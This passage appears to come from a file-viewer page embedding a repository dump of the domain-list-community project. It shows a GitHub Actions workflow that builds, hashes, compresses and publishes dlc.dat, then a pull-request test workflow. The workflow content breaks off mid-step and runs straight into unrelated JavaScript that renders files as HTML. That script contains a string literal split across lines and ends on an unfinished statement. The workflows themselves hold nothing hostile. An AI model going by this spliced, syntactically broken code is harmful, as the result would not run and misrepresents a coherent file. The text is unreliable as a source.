\"TAG_NAME=$(date +%Y%m%d%H%M%S)\" >> $GITHUB_ENV\n        shell: bash\n\n      - name: Build dlc.dat file\n        run: |\n          cd code || exit 1\n          go run ./ --outputdir=../ --exportlists=category-ads-all,tld-cn,cn,tld-\\!cn,geolocation-\\!cn,apple,icloud\n          cd ../ && rm -rf code\n\n      - name: Generate dlc.dat sha256 hash\n        run: |\n          sha256sum dlc.dat > dlc.dat.sha256sum\n\n      - name: Generate Zip\n        run: |\n          zip -9 dlc.dat.zip dlc.dat\n          sha256sum dlc.dat.zip > dlc.dat.zip.sha256sum\n\n      - name: Generate XZ\n        run: |\n          xz -z -9 -k dlc.dat\n          sha256sum dlc.dat.xz > dlc.dat.xz.sha256sum\n\n      - name: Git push assets to \"release\" branch\n        run: |\n          git init\n          git config --local user.name \"github-actions[bot]\"\n          git config --local user.email \"41898282+github-actions[bot]@users.noreply.github.com\"\n          git checkout -b release\n          git add *.txt *.sha256sum dlc.dat dlc.dat.zip dlc.dat.xz\n          git commit -m \"${{ env.RELEASE_NAME }}\"\n          git remote add origin \"https://${{ github.actor }}:${{ secrets.GITHUB_TOKEN }}@github.com/${{ github.repository }}\"\n          git push -f -u origin release\n\n      - name: Release and upload assets\n        run: |\n          gh release create ${{ env.TAG_NAME }} --generate-notes --latest --title ${{ env.RELEASE_NAME }} ./dlc.dat ./dlc.dat.*\n        env:\n          GITHUB_TOKEN: ${{ secrets.GITHUB_TOKEN }}\n"}, "domain-list-community-master/.github/workflows/test-pr.yml": {"type": "text", "content": "name: Test PR\non:\n  pull_request:\n    branches:\n      - master\njobs:\n  build:\n    name: Build\n    runs-on: ubuntu-latest\n\n    steps:\n      - name: Checkout codebase\n        uses: actions/checkout@v5\n        with:\n          path: code\n\n      - name: Setup Go\n        uses: actions/setup-go@v6\n for (const [name, info] of Object.entries(files)) {
  const section = document.createElement('section');
  section.className = 'file';
  const h2 = document.createElement('h2');
  h2.textContent = name;
  section.appendChild(h2);
  if (info.type === 'text') {
    const pre = document.createElement('pre');
    pre.textContent = info.content;
    section.appendChild(pre);
  } else if (info.type === 'base64') {

    let mime = 'application/octet-stream';
    const ext = name.split('.').pop().toLowerCase();
    if (['png','jpg','jpeg','gif','svg','webp'].includes(ext)) {
      if(ext==='svg') mime='image/svg+xml';
      else if(ext==='jpg') mime='image/jpeg';
      else mime='image/'+ext;
      const img = document.createElement('img');
      img.src = `data:${mime};base64,${info.content}`;
      section.appendChild(img);
    } else {
      const pre = document.createElement('pre');
      pre.textContent = 'Binary file base64:
'+info.content;
      section.appendChild(pre);
    }

    const pre = document.createElement('pre');

  }
